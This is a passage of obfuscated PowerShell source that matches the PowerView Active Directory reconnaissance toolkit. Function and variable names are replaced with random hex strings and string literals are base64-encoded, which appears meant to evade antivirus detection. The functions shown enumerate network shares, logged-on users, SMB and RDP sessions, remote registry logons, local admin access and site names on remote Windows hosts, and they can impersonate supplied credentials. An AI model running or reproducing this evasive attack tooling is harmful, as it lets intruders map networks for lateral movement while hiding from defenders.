                    ${2b17e1b109e5462d9830997612cc8a23}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGgAYQByAGUASQBuAGYAbwA='))))
                    ${b80d9562f792404db0205d365e956f5e} = ${c42795f7e27f4b1796f667d7a8a53e28}.ToInt64()
                    ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                    ${2b17e1b109e5462d9830997612cc8a23}
                }
                $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
            }
            else {
                Write-Verbose "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function edd8a9a976dd456aae0f84fa0f6de36e {
    [OutputType('PowerView.LoggedOnUserInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${13c189985c404b12a2d30fe9978381d3} = 1
            ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
            ${75506c77e2124e73b6b331abc518e3c5} = 0
            ${854afacc1bad4f30986f9660b9806381} = 0
            ${b002dc9ebaf545c591a08e495fbdae7c} = 0
            ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::NetWkstaUserEnum(${a9e149a622e146cb8c4c690f286bb4b0}, ${13c189985c404b12a2d30fe9978381d3}, [ref]${ee3c5c3d774c465195daa8ee399bdd14}, -1, [ref]${75506c77e2124e73b6b331abc518e3c5}, [ref]${854afacc1bad4f30986f9660b9806381}, [ref]${b002dc9ebaf545c591a08e495fbdae7c})
            ${b80d9562f792404db0205d365e956f5e} = ${ee3c5c3d774c465195daa8ee399bdd14}.ToInt64()
            if ((${186e3848daf342ca8207aeecd0de4352} -eq 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${ec017cb89b21456b8f352543646882a5}::GetSize()
                for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${75506c77e2124e73b6b331abc518e3c5}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                    ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                    ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${ec017cb89b21456b8f352543646882a5}
                    ${ba16046cc9a4431da8d63fa8f9d86bc5} = ${bb98c29e808a43c19f4dca0be9ac26b2} | Select-Object *
                    ${ba16046cc9a4431da8d63fa8f9d86bc5} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                    ${ba16046cc9a4431da8d63fa8f9d86bc5}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgBJAG4AZgBvAA=='))))
                    ${b80d9562f792404db0205d365e956f5e} = ${c42795f7e27f4b1796f667d7a8a53e28}.ToInt64()
                    ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                    ${ba16046cc9a4431da8d63fa8f9d86bc5}
                }
                $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
            }
            else {
                Write-Verbose "[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function e2676cf60bd549d88b901625237cfabc {
    [OutputType('PowerView.SessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${13c189985c404b12a2d30fe9978381d3} = 10
            ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
            ${75506c77e2124e73b6b331abc518e3c5} = 0
            ${854afacc1bad4f30986f9660b9806381} = 0
            ${b002dc9ebaf545c591a08e495fbdae7c} = 0
            ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::NetSessionEnum(${a9e149a622e146cb8c4c690f286bb4b0}, '', ${25e26cdbb7fa4a6c9a2f2483c34b00e6}, ${13c189985c404b12a2d30fe9978381d3}, [ref]${ee3c5c3d774c465195daa8ee399bdd14}, -1, [ref]${75506c77e2124e73b6b331abc518e3c5}, [ref]${854afacc1bad4f30986f9660b9806381}, [ref]${b002dc9ebaf545c591a08e495fbdae7c})
            ${b80d9562f792404db0205d365e956f5e} = ${ee3c5c3d774c465195daa8ee399bdd14}.ToInt64()
            if ((${186e3848daf342ca8207aeecd0de4352} -eq 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${707e8c719e474a6e9af27b6c807d0dba}::GetSize()
                for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${75506c77e2124e73b6b331abc518e3c5}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                    ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                    ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${707e8c719e474a6e9af27b6c807d0dba}
                    ${2f7cba0a183d419fa4df4b17f7c77de7} = ${bb98c29e808a43c19f4dca0be9ac26b2} | Select-Object *
                    ${2f7cba0a183d419fa4df4b17f7c77de7} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                    ${2f7cba0a183d419fa4df4b17f7c77de7}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                    ${b80d9562f792404db0205d365e956f5e} = ${c42795f7e27f4b1796f667d7a8a53e28}.ToInt64()
                    ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                    ${2f7cba0a183d419fa4df4b17f7c77de7}
                }
                $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Get-RegLoggedOn {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost'
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            try {
                ${95497154b7e54e72928191c2c215670f} = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGEAYwA2ADQANQA5ADMANQAxADEAMABiADQAZQBhAGUAYQA5ADYAZQA3AGIAZgA2AGYAMABiADIAZAA3AGYANAB9AA=='))))
                ${95497154b7e54e72928191c2c215670f}.GetSubKeyNames() | Where-Object { $_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAxAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsAJAA='))) } | ForEach-Object {
                    ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = e867aff561cb4dacb74c955fc46aa9c1 -23ca6558fa4b4ce695fc6d89d0b892e5 $_ -d6f8ca3d1c994c23b84c147c1aa4c2c9 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AUwBpAG0AcABsAGUA')))
                    if (${25e26cdbb7fa4a6c9a2f2483c34b00e6}) {
                        ${25e26cdbb7fa4a6c9a2f2483c34b00e6}, $UserDomain = ${25e26cdbb7fa4a6c9a2f2483c34b00e6}.Split('@')
                    }
                    else {
                        ${25e26cdbb7fa4a6c9a2f2483c34b00e6} = $_
                        $UserDomain = $Null
                    }
                    ${ce1922a5165a4933a6818e855066306c} = New-Object PSObject
                    ${ce1922a5165a4933a6818e855066306c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AGEAYwA2ADQANQA5ADMANQAxADEAMABiADQAZQBhAGUAYQA5ADYAZQA3AGIAZgA2AGYAMABiADIAZAA3AGYANAB9AA==')))
                    ${ce1922a5165a4933a6818e855066306c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                    ${ce1922a5165a4933a6818e855066306c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${25e26cdbb7fa4a6c9a2f2483c34b00e6}
                    ${ce1922a5165a4933a6818e855066306c} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAEkARAA='))) $_
                    ${ce1922a5165a4933a6818e855066306c}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAGUAZwBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgA='))))
                    ${ce1922a5165a4933a6818e855066306c}
                }
            }
            catch {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAFIAZQBnAEwAbwBnAGcAZQBkAE8AbgBdACAARQByAHIAbwByACAAbwBwAGUAbgBpAG4AZwAgAHIAZQBtAG8AdABlACAAcgBlAGcAaQBzAHQAcgB5ACAAbwBuACAAJwAkAHsAYQBjADYANAA1ADkAMwA1ADEAMQAwAGIANABlAGEAZQBhADkANgBlADcAYgBmADYAZgAwAGIAMgBkADcAZgA0AH0AJwAgADoAIAAkAF8A')))
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function Get-NetRDPSession {
    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${a29af4562c4d4418b15ca20b79350eb4} = ${60499e296285494c8693c29799a8735a}::WTSOpenServerEx(${a9e149a622e146cb8c4c690f286bb4b0})
            if (${a29af4562c4d4418b15ca20b79350eb4} -ne 0) {
                ${29a709a84a0c4d36bcc9e176c958f1b9} = [IntPtr]::Zero
                ${6f1a4f7acfbd436b8f9f824b70f9a049} = 0
                ${186e3848daf342ca8207aeecd0de4352} = ${60499e296285494c8693c29799a8735a}::WTSEnumerateSessionsEx(${a29af4562c4d4418b15ca20b79350eb4}, [ref]1, 0, [ref]${29a709a84a0c4d36bcc9e176c958f1b9}, [ref]${6f1a4f7acfbd436b8f9f824b70f9a049});${a4b4c23e0ef94f2bab076518375de072} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                ${b80d9562f792404db0205d365e956f5e} = ${29a709a84a0c4d36bcc9e176c958f1b9}.ToInt64()
                if ((${186e3848daf342ca8207aeecd0de4352} -ne 0) -and (${b80d9562f792404db0205d365e956f5e} -gt 0)) {
                    ${3c5be92cf1c54e5e96ef59cd44e2283f} = ${026cb2576e7343f29cf542405875fd06}::GetSize()
                    for (${35c58f1556d947ac8053e2f546574b9e} = 0; (${35c58f1556d947ac8053e2f546574b9e} -lt ${6f1a4f7acfbd436b8f9f824b70f9a049}); ${35c58f1556d947ac8053e2f546574b9e}++) {
                        ${c42795f7e27f4b1796f667d7a8a53e28} = New-Object System.Intptr -ArgumentList ${b80d9562f792404db0205d365e956f5e}
                        ${bb98c29e808a43c19f4dca0be9ac26b2} = ${c42795f7e27f4b1796f667d7a8a53e28} -as ${026cb2576e7343f29cf542405875fd06}
                        ${3e5bf59a034d43609e40d79d0558c896} = New-Object PSObject
                        if (${bb98c29e808a43c19f4dca0be9ac26b2}.pHostName) {
                            ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${bb98c29e808a43c19f4dca0be9ac26b2}.pHostName
                        }
                        else {
                            ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
                        }
                        ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBOAGEAbQBlAA=='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.pSessionName
                        if ($(-not ${bb98c29e808a43c19f4dca0be9ac26b2}.pDomainName) -or (${bb98c29e808a43c19f4dca0be9ac26b2}.pDomainName -eq '')) {
                            ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${bb98c29e808a43c19f4dca0be9ac26b2}.pUserName)"
                        }
                        else {
                            ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) "$(${bb98c29e808a43c19f4dca0be9ac26b2}.pDomainName)\$(${bb98c29e808a43c19f4dca0be9ac26b2}.pUserName)"
                        }
                        ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty 'ID' ${bb98c29e808a43c19f4dca0be9ac26b2}.SessionID
                        ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGEAdABlAA=='))) ${bb98c29e808a43c19f4dca0be9ac26b2}.State
                        ${c7a9b0a8bf754a789d030c6cd7240112} = [IntPtr]::Zero
                        ${23b9f035aeba4f6c9786a1a89da1242f} = 0
                        ${e51dcfba659540448adbd37cfbc56ed8} = ${60499e296285494c8693c29799a8735a}::WTSQuerySessionInformation(${a29af4562c4d4418b15ca20b79350eb4}, ${bb98c29e808a43c19f4dca0be9ac26b2}.SessionID, 14, [ref]${c7a9b0a8bf754a789d030c6cd7240112}, [ref]${23b9f035aeba4f6c9786a1a89da1242f});${e121419d4e294040a92661d2b766d89c} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                        if (${e51dcfba659540448adbd37cfbc56ed8} -eq 0) {
                            Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${e121419d4e294040a92661d2b766d89c}).Message)"
                        }
                        else {
                            ${d9a76c7b409e4d6fbd8dee744534f817} = ${c7a9b0a8bf754a789d030c6cd7240112}.ToInt64()
                            ${ddf91e412a4645f7ae7b96aaf04c1277} = New-Object System.Intptr -ArgumentList ${d9a76c7b409e4d6fbd8dee744534f817}
                            ${a07b6e184a3741dfafd238a4fe7cd638} = ${ddf91e412a4645f7ae7b96aaf04c1277} -as ${6845e7deaa864bfd9f953b68f1d7dd61}
                            ${60cac95dcd01459c9c40643ab4400cb1} = ${a07b6e184a3741dfafd238a4fe7cd638}.Address
                            if (${60cac95dcd01459c9c40643ab4400cb1}[2] -ne 0) {
                                ${60cac95dcd01459c9c40643ab4400cb1} = [String]${60cac95dcd01459c9c40643ab4400cb1}[2]+'.'+[String]${60cac95dcd01459c9c40643ab4400cb1}[3]+'.'+[String]${60cac95dcd01459c9c40643ab4400cb1}[4]+'.'+[String]${60cac95dcd01459c9c40643ab4400cb1}[5]
                            }
                            else {
                                ${60cac95dcd01459c9c40643ab4400cb1} = $Null
                            }
                            ${3e5bf59a034d43609e40d79d0558c896} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUASQBQAA=='))) ${60cac95dcd01459c9c40643ab4400cb1}
                            ${3e5bf59a034d43609e40d79d0558c896}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBSAEQAUABTAGUAcwBzAGkAbwBuAEkAbgBmAG8A'))))
                            ${3e5bf59a034d43609e40d79d0558c896}
                            $Null = ${60499e296285494c8693c29799a8735a}::WTSFreeMemory(${c7a9b0a8bf754a789d030c6cd7240112})
                            ${b80d9562f792404db0205d365e956f5e} += ${3c5be92cf1c54e5e96ef59cd44e2283f}
                        }
                    }
                    $Null = ${60499e296285494c8693c29799a8735a}::WTSFreeMemoryEx(2, ${29a709a84a0c4d36bcc9e176c958f1b9}, ${6f1a4f7acfbd436b8f9f824b70f9a049})
                }
                else {
                    Write-Verbose "[Get-NetRDPSession] Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
                }
                $Null = ${60499e296285494c8693c29799a8735a}::WTSCloseServer(${a29af4562c4d4418b15ca20b79350eb4})
            }
            else {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAE4AZQB0AFIARABQAFMAZQBzAHMAaQBvAG4AXQAgAEUAcgByAG8AcgAgAG8AcABlAG4AaQBuAGcAIAB0AGgAZQAgAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFMAZQBzAHMAaQBvAG4AIABIAG8AcwB0ACAAKABSAEQAIABTAGUAcwBzAGkAbwBuACAASABvAHMAdAApACAAcwBlAHIAdgBlAHIAIABmAG8AcgA6ACAAJAB7AGEAYwA2ADQANQA5ADMANQAxADEAMABiADQAZQBhAGUAYQA5ADYAZQA3AGIAZgA2AGYAMABiADIAZAA3AGYANAB9AA==')))
            }
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function c046e85b237e4b6eb3504c4f264b59a2 {
    [OutputType('PowerView.AdminAccess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            ${a29af4562c4d4418b15ca20b79350eb4} = ${010428763869431e80e18c1b0127d8f7}::OpenSCManagerW($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABcACQAewBhADkAZQAxADQAOQBhADYAMgAyAGUAMQA0ADYAYwBiADgAYwA0AGMANgA5ADAAZgAyADgANgBiAGIANABiADAAfQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBzAEEAYwB0AGkAdgBlAA=='))), 0xF003F);${a4b4c23e0ef94f2bab076518375de072} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
            ${4af9d61fc9ca4e489ad8de82d4f598a8} = New-Object PSObject
            ${4af9d61fc9ca4e489ad8de82d4f598a8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
            if (${a29af4562c4d4418b15ca20b79350eb4} -ne 0) {
                $Null = ${010428763869431e80e18c1b0127d8f7}::CloseServiceHandle(${a29af4562c4d4418b15ca20b79350eb4})
                ${4af9d61fc9ca4e489ad8de82d4f598a8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $True
            }
            else {
                Write-Verbose "[Test-AdminAccess] Error: $(([ComponentModel.Win32Exception] ${a4b4c23e0ef94f2bab076518375de072}).Message)"
                ${4af9d61fc9ca4e489ad8de82d4f598a8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAEEAZABtAGkAbgA='))) $False
            }
            ${4af9d61fc9ca4e489ad8de82d4f598a8}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAGQAbQBpAG4AQQBjAGMAZQBzAHMA'))))
            ${4af9d61fc9ca4e489ad8de82d4f598a8}
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
            dcf0a8b111a84302b05d40b1db05338c -d4e1296b557440d7b406a9378e307719 ${9d861c835c924c73aa92c66fb935caca}
        }
    }
}
function c738055cf72946c7a5b1df0a9dc66984 {
    [OutputType('PowerView.ComputerSite')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${ac645935110b4eaea96e7bf6f0b2d7f4} = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${9d861c835c924c73aa92c66fb935caca} = cb88cae78c7042af8720773b18453f4d -Credential $Credential
        }
    }
    PROCESS {
        ForEach (${a9e149a622e146cb8c4c690f286bb4b0} in ${ac645935110b4eaea96e7bf6f0b2d7f4}) {
            if (${a9e149a622e146cb8c4c690f286bb4b0} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAD8AOgBbADAALQA5AF0AewAxACwAMwB9AFwALgApAHsAMwB9AFsAMAAtADkAXQB7ADEALAAzAH0AJAA=')))) {
                ${1ab4725ddb4a46688da377ff9cc908bd} = ${a9e149a622e146cb8c4c690f286bb4b0}
                ${a9e149a622e146cb8c4c690f286bb4b0} = [System.Net.Dns]::GetHostByAddress(${a9e149a622e146cb8c4c690f286bb4b0}) | Select-Object -ExpandProperty HostName
            }
            else {
                ${1ab4725ddb4a46688da377ff9cc908bd} = @(e2da9d93a1f04bbe8fe558de28bcac3c -ac645935110b4eaea96e7bf6f0b2d7f4 ${a9e149a622e146cb8c4c690f286bb4b0})[0].IPAddress
            }
            ${ee3c5c3d774c465195daa8ee399bdd14} = [IntPtr]::Zero
            ${186e3848daf342ca8207aeecd0de4352} = ${94271fac322f428e9deaac6d91dfc36e}::DsGetSiteName(${a9e149a622e146cb8c4c690f286bb4b0}, [ref]${ee3c5c3d774c465195daa8ee399bdd14})
            ${83894a214ed54e198ca73dd3e40441d8} = New-Object PSObject
            ${83894a214ed54e198ca73dd3e40441d8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${a9e149a622e146cb8c4c690f286bb4b0}
            ${83894a214ed54e198ca73dd3e40441d8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${1ab4725ddb4a46688da377ff9cc908bd}
            if (${186e3848daf342ca8207aeecd0de4352} -eq 0) {
                $Sitename = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto(${ee3c5c3d774c465195daa8ee399bdd14})
                ${83894a214ed54e198ca73dd3e40441d8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) $Sitename
            }
            else {
                Write-Verbose "[Get-NetComputerSiteName] Error: $(([ComponentModel.Win32Exception] ${186e3848daf342ca8207aeecd0de4352}).Message)"
                ${83894a214ed54e198ca73dd3e40441d8} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA=='))) ''
            }
            ${83894a214ed54e198ca73dd3e40441d8}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBDAG8AbQBwAHUAdABlAHIAUwBpAHQAZQA='))))
            $Null = ${94271fac322f428e9deaac6d91dfc36e}::NetApiBufferFree(${ee3c5c3d774c465195daa8ee399bdd14})
            ${83894a214ed54e198ca73dd3e40441d8}
        }
    }
    END {
        if (${9d861c835c924c73aa92c66fb935caca}) {
